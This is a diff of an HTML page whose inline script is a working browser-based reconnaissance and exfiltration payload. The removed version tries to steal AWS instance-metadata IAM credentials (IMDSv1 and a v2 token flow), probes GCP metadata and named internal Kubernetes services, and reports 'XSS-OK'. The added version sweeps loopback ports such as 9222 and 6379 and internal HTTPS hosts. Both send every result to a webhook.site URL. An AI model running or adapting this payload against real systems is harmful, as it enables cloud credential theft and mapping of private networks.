@@ -1,43 +1,33 @@
-<!doctype html><html><head><title>landing</title></head><body>loading<script>
+<!doctype html><html><head><title>r2</title></head><body>x<script>
 var EXF='https://webhook.site/25216e90-dea7-4f7f-8b7b-349b8badbe12';
-function send(tag, txt){
-  try{ fetch(EXF+'?t='+encodeURIComponent(tag)+'&d='+encodeURIComponent(String(txt).slice(0,1800)),{mode:'no-cors'}); }catch(e){}
-}
+function send(tag, txt){ try{ fetch(EXF+'?t='+encodeURIComponent(tag)+'&d='+encodeURIComponent(String(txt).slice(0,1500)),{mode:'no-cors'}); }catch(e){} }
 function probe(tag, url, opts){
-  // CORS-read attempt (works if web security disabled or ACAO *)
   fetch(url, opts||{}).then(function(r){ return r.text().then(function(t){ send(tag+'-READ', r.status+' :: '+t); }); })
     .catch(function(e){
       send(tag+'-READFAIL', String(e));
-      // no-cors oracle: resolves on network success (opaque), rejects on failure
       fetch(url, Object.assign({}, opts||{}, {mode:'no-cors'}))
-        .then(function(){ send(tag+'-REACH', 'reachable-no-cors'); })
+        .then(function(){ send(tag+'-REACH', 'reachable'); })
         .catch(function(e2){ send(tag+'-NOREACH', String(e2)); });
     });
 }
-// AWS IMDSv1
-probe('imds-v1-roles', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
-probe('imds-v1-host', 'http://169.254.169.254/latest/meta-data/hostname');
-// AWS IMDSv2 token PUT
-fetch('http://169.254.169.254/latest/api/token', {method:'PUT', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'21600'}})
-  .then(function(r){return r.text();})
-  .then(function(t){ send('imds-v2-TOKEN', t);
-    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {headers:{'X-aws-ec2-metadata-token':t}})
-      .then(function(r){return r.text();}).then(function(x){ send('imds-v2-ROLES', x); })
-      .catch(function(e){ send('imds-v2-ROLES-FAIL', String(e)); }); })
-  .catch(function(e){ send('imds-v2-FAIL', String(e)); });
-// GCP
-probe('gcp-meta', 'http://metadata.google.internal/computeMetadata/v1/instance/hostname', {headers:{'Metadata-Flavor':'Google'}});
-probe('gcp-169', 'http://169.254.169.254/computeMetadata/v1/instance/hostname', {headers:{'Metadata-Flavor':'Google'}});
-// internal k8s (from W157 wart: lightning.lightning.svc.cluster.local)
-probe('k8s-lightning-admin', 'http://lightning.lightning.svc.cluster.local/admin-v2/');
-probe('k8s-lightning-root', 'http://lightning.lightning.svc.cluster.local/');
-probe('k8s-agents-health', 'http://agents.agents.svc.cluster.local/health');
-probe('k8s-mcp-gw', 'http://mcp-gateway/health');
-probe('k8s-fed', 'http://fed.fed.svc.cluster.local/health');
-probe('k8s-apiserver', 'https://kubernetes.default.svc/version');
-// egress + exec proof
-send('EXEC', 'JS-EXECUTED-UA:'+navigator.userAgent);
-fetch('https://webhook.site/25216e90-dea7-4f7f-8b7b-349b8badbe12?t=EGRESS-OK',{mode:'no-cors'});
-document.title='XSS-OK';
-document.body.textContent='POC-LOADED';
+send('R2-EXEC','alive');
+// 1. mixed-content oracle: plain http PUBLIC host
+probe('mc-oracle-ex', 'http://example.com/');
+probe('mc-oracle-nev', 'http://neverssl.com/');
+// 2. loopback sweep (mixed-content exempt per spec)
+var ports=[9222,15020,80,443,8080,3000,5000,8000,8888,9090,5601,6379,5432,3306,15672];
+for (var i=0;i<ports.length;i++){
+  (function(p){ probe('lo-'+p, 'http://127.0.0.1:'+p+'/'); })(ports[i]);
+}
+probe('lo-localhost-9222', 'http://localhost:9222/json/version');
+probe('lo-ipv6', 'http://[::1]:9222/json/version');
+// 3. https internal DNS (not mixed content)
+probe('hi-fed', 'https://fed.fed.svc.cluster.local/health');
+probe('hi-lightning', 'https://lightning.lightning.svc.cluster.local/admin-v2/');
+probe('hi-agents', 'https://agents.agents.svc.cluster.local/health');
+probe('hi-mcpgw', 'https://mcp-gateway/health');
+probe('hi-k8s', 'https://kubernetes.default.svc/version');
+// 4. metadata over https (cert fail but connect oracle)
+probe('hi-imds', 'https://169.254.169.254/latest/meta-data/');
+document.title='R2-OK'; document.body.textContent='R2';
 </script></body></html>
